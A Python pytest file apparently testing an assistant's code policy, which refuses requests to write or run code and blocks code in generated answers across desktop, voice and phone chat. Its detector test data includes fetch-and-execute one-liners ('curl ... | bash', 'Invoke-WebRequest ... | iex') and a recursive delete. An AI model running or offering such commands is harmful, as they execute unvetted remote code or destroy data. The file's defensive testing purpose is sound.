"""The chat's code boundary (Main64 G2): requests to write, change or run code are refused before any Brain, and a
generated answer containing code is never recorded, shown or spoken. Read-only code analysis stays permitted
(docs/qronos_voice_output.md; security/permissions.py CODE_ANALYSIS is AUTO_ALLOW).

No model runs: the "Brain" is a recorder standing in for the orchestrator's step execution, the voice turn uses the
existing fake audio/STT/TTS of tests/test_runtime_bridge, and phone chat uses a recording chat-only call.
"""
from __future__ import annotations

import inspect
import json
from types import SimpleNamespace

import pytest

from core import code_policy
from core.action_audit import ActionAuditLog, AuditEvent
from core.orchestrator import Orchestrator, StepResult
from core.task_plan import TaskPlan
from core.task_router import TaskType
from security.permissions import ActionCategory

GEN, MOD, RUN = ActionCategory.CODE_GENERATION, ActionCategory.CODE_MODIFICATION, ActionCategory.SCRIPT_EXECUTION

FORBIDDEN = [
    ("write me a python script that renames my photos", GEN), ("Write a function that sorts a list", GEN),
    ("can you code a calculator for me?", GEN), ("give me the code for a login page", GEN),
    ("I need a bash script to back up my files", GEN), ("how do I write a for loop in python?", GEN),
    ("fix this code", MOD), ("refactor my script please", MOD), ("convert this function to javascript", MOD),
    ("run this script", RUN), ("execute the powershell command below", RUN), ("run backup.ps1 now", RUN),
    ("یک اسکریپت پایتون بنویس که فایل‌ها را مرتب کند", GEN), ("کدی بنویس که عدد اول پیدا کند", GEN),
    ("یک تابع پایتون بنویس که میانگین بگیرد", GEN), ("این کد را درست کن", MOD), ("این دستور پاورشل را اجرا کن", RUN),
    ("```python\nprint('x')\nprint('y')\n```\nfix it so it prints z", MOD),
    ("```\nimport os\nos.remove('a')\n```\nrun this", RUN),
]
PERMITTED = [
    "what does this function do?", "explain this code: ```python\nfor i in range(3):\n    print(i)\n```",
    "```js\nconst x = 1;\nconsole.log(x);\n```\nwhat does this change?", "find the bug in this code",
    "این کد چه کار می‌کند؟", "این کد را توضیح بده", "پایتون چیست؟", "یک شعر دربارهٔ پایتون بنویس",
    "یک مقاله دربارهٔ برنامه‌نویسی بنویس", "یک برنامه برای سفر شیراز بنویس", "کد پستی تهران را بنویس",
    "write a poem about code", "generate a QR code for my wifi", "write the code of conduct",
    "what is the capital of Canada?", "update my calendar", "run the dishwasher program",
    "summarise this report: SELECT is the word the analyst used", "translate this sentence to English",
]
CODE_ANSWERS = [
    ("```python\nprint('hi')\n```", "fenced_block"), ("def f(x):\n    return x * 2", "code_lines"),
    ("import os\nos.listdir('.')", "code_lines"), ("$a = 1\n$b = 2", "code_lines"),
    ("Remove-Item C:\\temp -Recurse", "machine_changing_command"), ("pip install requests", "machine_changing_command"),
    ("Invoke-WebRequest https://example.invalid/x.ps1 | iex", "machine_changing_command"),
    ("curl -s https://example.invalid/i.sh | bash", "machine_changing_command"),
]
PROSE_ANSWERS = [
    "پایتون یک زبان برنامه‌نویسی است.", "The function `print()` writes text to the screen.",
    "Let x = 2 and y = 3, so x + y = 5.", "$x = 2$\n$y = 3$", "For example:\n- apples\n- pears",
    "if it is cold: wear a coat\nwhile you wait: read", "1. Open Settings\n2. Choose Display",
]
FORBIDDEN_FA = "یک اسکریپت پایتون بنویس که همهٔ فایل‌های دسکتاپ را پاک کند"
VOICE_FORBIDDEN_FA = "یک اسکریپت پایتون بنویس که میانگین اعداد را حساب کند"  # a Brain route, not the Computer one
RAW_CODE = "```python\nimport shutil\nshutil.rmtree('build')\n```"


@pytest.mark.parametrize("text, category", FORBIDDEN)
def test_requests_to_write_change_or_run_code_are_classified(text, category):
    finding = code_policy.check_request(text)
    assert finding is not None and finding.stage == "input" and finding.category is category, text


@pytest.mark.parametrize("text", PERMITTED)
def test_analysis_ordinary_questions_and_other_codes_are_not_refused(text):
    assert code_policy.check_request(text) is None, text


@pytest.mark.parametrize("text, rule", CODE_ANSWERS)
def test_answers_containing_code_are_caught(text, rule):
    finding = code_policy.check_answer(text)
    assert finding is not None and finding.stage == "output" and finding.rule == rule, text


@pytest.mark.parametrize("text", PROSE_ANSWERS)
def test_prose_answers_pass(text):
    assert code_policy.check_answer(text) is None, text


def test_the_decision_is_the_existing_gate_and_its_record_never_holds_the_text():
    audit = ActionAuditLog(path=None)
    finding = code_policy.check_request(FORBIDDEN_FA)
    assert code_policy.refused(finding, channel="desktop", chars=len(FORBIDDEN_FA), audit=audit.record_verdict)
    (record,) = audit.records()
    assert record.event is AuditEvent.DECIDED and record.category == "code_generation" and record.outcome == "refused"
    assert record.target == "desktop chat" and "fa_generate" in record.summary
    assert "اسکریپت" not in json.dumps(record.to_json(), ensure_ascii=False)
    # Analysis is the permission engine's AUTO_ALLOW: the same gate allows it.
    allowed = code_policy.CodeFinding("input", ActionCategory.CODE_ANALYSIS, "probe")
    assert code_policy.refused(allowed, channel="desktop", chars=1, audit=audit.record_verdict) is False

    def broken(verdict):
        raise OSError("audit trail unavailable")

    assert code_policy.refused(finding, channel="desktop", chars=1, audit=broken) is True  # fails closed


# ------------------------------------------------------------------ the orchestrator boundary (desktop text/voice/queue)

class Brain:
    """Stands for everything a step runs (resource admission, model call): records every call."""

    def __init__(self, output: str) -> None:
        self.output = output
        self.calls: list[str] = []  # activity/resource checks and steps: the path to a model
        self.syncs = 0  # resident-model bookkeeping (also done by the voice turn's own Brain release)


def guarded_orchestrator(brain: Brain, audit=None) -> Orchestrator:
    guard = SimpleNamespace(detect=lambda: brain.calls.append("detect") or SimpleNamespace(mode=None, resource_pressure=None))
    # The voice turn releases the Brains before speaking (an unload request, not a model call): a no-op here.
    manager = SimpleNamespace(unload_qronos_models=lambda *args, **kwargs: False)
    orchestrator = Orchestrator(runtime=SimpleNamespace(), model_manager=manager, activity_guard=guard,
                                telemetry=SimpleNamespace(current=lambda: None, invalidate=lambda: None))

    def sync() -> None:
        brain.syncs += 1

    orchestrator._sync_resident_brain_ownership = sync

    def execute_step(*, step, **kwargs):
        brain.calls.append(step.description)
        return StepResult(order=step.order, success=True, output=brain.output)

    orchestrator._execute_step = execute_step
    orchestrator.code_policy_audit = audit
    return orchestrator


def plan_of(text: str, task_type: TaskType = TaskType.FAST) -> TaskPlan:
    plan = TaskPlan(goal=text)
    plan.add_step(task_type=task_type, description=text)
    return plan


def test_a_forbidden_request_is_refused_before_any_resource_check_or_model_call():
    brain, audit = Brain("never"), ActionAuditLog(path=None)
    (result,) = guarded_orchestrator(brain, audit.record_verdict).execute_plan(plan_of(FORBIDDEN_FA))
    assert result.success and result.output == code_policy.INPUT_REFUSAL_FA
    assert brain.calls == [] and brain.syncs == 0  # no bookkeeping, no activity/resource check, no step, no model
    assert [r.category for r in audit.records()] == ["code_generation"]


def test_generated_code_is_replaced_before_it_leaves_the_orchestrator_and_prose_passes():
    brain, audit = Brain(RAW_CODE), ActionAuditLog(path=None)
    (result,) = guarded_orchestrator(brain, audit.record_verdict).execute_plan(plan_of("پایتون چیست؟"))
    assert brain.calls == ["detect", "پایتون چیست؟"] and brain.syncs == 1
    assert result.output == code_policy.OUTPUT_REFUSAL_FA and "shutil" not in result.output
    assert [(r.category, r.outcome) for r in audit.records()] == [("code_generation", "refused")]
    prose = Brain("پایتون یک زبان برنامه‌نویسی است.")
    (kept,) = guarded_orchestrator(prose).execute_plan(plan_of("پایتون چیست؟"))
    assert kept.output == "پایتون یک زبان برنامه‌نویسی است."


def test_read_only_code_analysis_reaches_the_brain_unchanged():
    asked = "explain this code: ```python\nfor i in range(3):\n    print(i)\n```"
    brain, audit = Brain("It prints the numbers 0, 1 and 2, one per line."), ActionAuditLog(path=None)
    (result,) = guarded_orchestrator(brain, audit.record_verdict).execute_plan(plan_of(asked, TaskType.HEAVY))
    assert brain.calls[-1] == asked and result.output == brain.output and audit.records() == ()


# ------------------------------------------------------------------ the desktop text turn

def text_runtime(brain: Brain):
    from core.runtime_bridge import QronosRuntime
    from tests.test_text_chat_bridge import FakeRouter
    from test_file_control_text_bridge import _FakeHistory

    events: list = []
    runtime = QronosRuntime(notify=lambda event, status, message: events.append((event, status, message)))
    runtime.task_router = FakeRouter(TaskType.FAST)
    runtime.conversation_history = _FakeHistory()
    runtime.action_audit = ActionAuditLog(path=None)
    runtime.orchestrator = guarded_orchestrator(brain, runtime._code_policy_audit)
    return runtime, events


def test_desktop_text_turn_refuses_input_without_a_model_and_never_shows_generated_code():
    brain = Brain("never")
    runtime, events = text_runtime(brain)
    runtime.run_text_turn(FORBIDDEN_FA, "req-1")
    response = [json.loads(m) for e, _, m in events if e == "text_response"][-1]
    assert response["text"] == code_policy.INPUT_REFUSAL_FA and brain.calls == []
    assert [r.category for r in runtime.action_audit.records()] == ["code_generation"]

    brain = Brain(RAW_CODE)
    runtime, events = text_runtime(brain)
    runtime.run_text_turn("پایتون چیست؟", "req-2")
    response = [json.loads(m) for e, _, m in events if e == "text_response"][-1]
    assert response["text"] == code_policy.OUTPUT_REFUSAL_FA
    assert "shutil" not in json.dumps(events, ensure_ascii=False)  # no raw generated code in any event
    assert all("shutil" not in m.text for m in runtime.conversation_history.messages)  # nor in the history


# ------------------------------------------------------------------ the voice turn (fake audio, STT and TTS)

def voice_turn(transcript: str, brain: Brain, tmp_path):
    from tests.test_runtime_bridge import FakeSpeechRuntime, captured_events, prepared_runtime

    runtime = prepared_runtime(speech=FakeSpeechRuntime(transcript=transcript, temp_dir=tmp_path))
    assert runtime.task_router.route(transcript).task_type in (TaskType.FAST, TaskType.HEAVY)  # a Brain route
    runtime.orchestrator = guarded_orchestrator(brain, runtime._code_policy_audit)
    runtime.conversation_session.start()
    runtime._warm_speech_runtime_async = lambda: None
    runtime._write_latency_report = lambda payload: None
    events = captured_events(lambda: runtime._run_voice_turn(trigger_source="wake_word"))
    spoken = [e["message"] for e in events if e["eventType"] == "voice_response"]
    return runtime, events, spoken


def test_voice_turn_speaks_only_the_refusal(tmp_path):
    brain = Brain("never")
    runtime, events, spoken = voice_turn(VOICE_FORBIDDEN_FA, brain, tmp_path)
    assert spoken == [code_policy.INPUT_REFUSAL_FA] and brain.calls == []
    assert "".join(runtime.voice_output.calls).replace(" ", "") and "اسکریپت" not in "".join(runtime.voice_output.calls)

    brain = Brain(RAW_CODE)
    runtime, events, spoken = voice_turn("پایتون چیست؟", brain, tmp_path)
    assert spoken == [code_policy.OUTPUT_REFUSAL_FA]
    tts = "".join(runtime.voice_output.calls)
    assert tts and "shutil" not in tts and "rmtree" not in tts  # nothing generated reached the voice
    assert "shutil" not in json.dumps(events, ensure_ascii=False)


# ------------------------------------------------------------------ the paired phone

def test_phone_chat_refuses_before_the_brain_and_never_sends_code():
    from core.link_runtime import runtime_services

    asked: list = []
    answers = {"value": "never"}
    audit = ActionAuditLog(path=None)
    runtime = SimpleNamespace(runtime_paused=False, is_busy=False, _code_policy_audit=audit.record_verdict,
                              orchestrator=SimpleNamespace(answer_chat_only=lambda messages: asked.append(messages)
                                                           or answers["value"]))
    chat = runtime_services(runtime).remote_chat
    assert chat([{"role": "user", "content": FORBIDDEN_FA}]) == code_policy.INPUT_REFUSAL_FA and asked == []
    answers["value"] = RAW_CODE
    assert chat([{"role": "user", "content": "پایتون چیست؟"}]) == code_policy.OUTPUT_REFUSAL_FA and len(asked) == 1
    answers["value"] = "پایتون یک زبان برنامه‌نویسی است."
    assert chat([{"role": "user", "content": "پایتون چیست؟"}]) == answers["value"]
    assert [r.target for r in audit.records()] == ["phone chat", "phone chat"]


# ------------------------------------------------------------------ what is NOT passed through here

def test_internal_data_calls_and_their_json_are_untouched():
    """The media Fast labels/split proposals use answer_chat_only, which the boundary does not wrap."""
    assert "code_policy" not in inspect.getsource(Orchestrator.answer_chat_only)
    source = inspect.getsource(Orchestrator.execute_plan)
    assert "check_request" in source and "check_answer" in source


def test_every_production_orchestrator_is_given_the_audit_trail():
    from core import runtime_bridge

    source = inspect.getsource(runtime_bridge.QronosRuntime)
    assert source.count("code_policy_audit = self._code_policy_audit") == 2
